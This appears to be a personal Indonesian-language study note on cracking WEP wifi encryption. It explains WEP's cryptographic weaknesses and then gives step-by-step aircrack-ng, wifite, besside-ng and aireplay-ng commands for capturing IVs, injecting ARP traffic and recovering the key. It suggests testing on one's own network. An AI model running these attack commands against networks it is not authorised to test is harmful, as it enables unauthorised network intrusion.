# WEP Hacking
#wireless #encryption 

Key: 
- Packet injection
- 24 - bit IV

## Karakteristik
WEP menggunakan RC4 stream cipher dengan kunci sebanyak 64-bit atau 128-bit. Jika dikurangi dengan total IV nya, maka sebenarnya kunci yang benar-benar dipakai adalah
- `40 / 64 bit` . Karena menggunakan 40-bit key, kuncinya hanya membutuhkan 5 karakter $5*8=40$ (pada ASCII, tiap karakter = 8 bit atau 1 byte) atau 10 karakter hex.
- `104 / 128 bit` . Passphrase 13 karakter ASCII atau 26 karakter hex.

## Vulnerability
- WEP menggunakan 24-bit IV, yang mana dianggap lemah secara kriptografi. Pada 24-bit IV, ada kemungkinan 50% IV yang sama akan terulang setelah 5.000 paket. Sehingga sangat rentan pada lokasi yang sangat sibuk. Hal ini menyebabkan WEP mudah dijebol. Packet injection untuk mengirimkan bogus packet juga menyebabkan WEP makin cepat dipecahkan. 
- Dari 64-bit kunci, hanya 40-bit yang bersifat rahasia. Begitu pula pada versi 128-bit kunci yang hanya ada 104-bit yang bersifat rahasia.
- Pengiriman IV sendiri adalah dalam plain text, sehingga mempermudah attacker untuk melakukan recovery kunci dari rotasi 24 bit IV.
- 32 bit CRC / ICV (Integrity Check Value) sehingga lemah terhadap tampering dan bit flipping attack.

**Teknik serang:** Attacker bisa memaksa IV yang sama digunakan untuk yang kedua kali dengan melakukan replay network traffic dengan jumlah yang sangat banyak.


## Eksploitasi
Untuk tes eksploitasi, gunakan wifi sendiri dengan setting bit kunci berjumlah kecil `40/64 bit`. Tujuannya untuk mempercepat proses dari WEP hacking itu sendiri. Inisiasi serangannya adalah:
```sh
# masuk ke monitoring mode
airmon-ng start wlan0

# apabila terdapat kendala proses
airmon-ng check kill
```

Menggunakan **wifite** untuk cracking WEP dan menggunakan random MAC address. Tools ini dapat melakukan otomasi serangan airodump, aireplay, dan aircrack.
```sh
wifite --wep --mac
```

Menggunakan bessid-ng.
```sh
# untuk mendapatkan .pcap
besside-ng -c _ChannelTargetIsOn_ -b _BSSIDofTargetNetwork_ _NameOfInterfaceCard_

besside-ng -b 7C:CA:ED:A4:9B:EE -c 11 wlan0mon

# collect the IVs (Initialization Vectors) from the something.cap file
aircrack-ng ./wep.cap
```


Old but gold technique, untuk memahami proses cracking dari WEP. Serangan dari aireplay-ng akan diulang setiap 5000 IVs sampai berhasil.
```sh
# melihat WEP yang ada di sekitar
sudo airodump-ng wlan0mon --encrypt WEP

# tentukan bssid yang digunakan, channel yang digunakan, masukkan capture ke WEPcrack.pcap file
airodump-ng --bssid 00:09:5B:6F:64:1E -c 11 -w WEPcrack mon0

# apabila tidak ada traffic, kita bisa inject ARP traffic (untuk mempercepat proses mendapatkan reused IV + key) - cafe latte attack
aireplay-ng -3 -b 00::09:58:6F:64:1E -h 44:60:57:c8:58:A0 mon0

# crack
aircrack-ng WEPcrack-01.cap

# kalau belum ter-crack
aircrack-ng WEPcrack-02.cap
```


## Kesimpulan
Kecuali buat nangkap script kiddies sedang melakukan hacking, tidak ada alasan lain untuk menggunakan WEP.


## Sumber
- https://null-byte.wonderhowto.com/how-to/hack-wi-fi-hunting-down-cracking-wep-networks-0183712/
- https://en.wikipedia.org/wiki/Initialization_vector
- https://teckk2.github.io/wifi%20pentesting/2018/07/20/Hacking-WEP.html
- https://en.wikipedia.org/wiki/Wired_Equivalent_Privacy#:~:text=Most%20devices%20also%20allow%20the%20user%20to%20enter%20it%20as,128%20bits%20of%20WEP%20key).
- https://www.youtube.com/watch?v=ab6GYvKxfV0
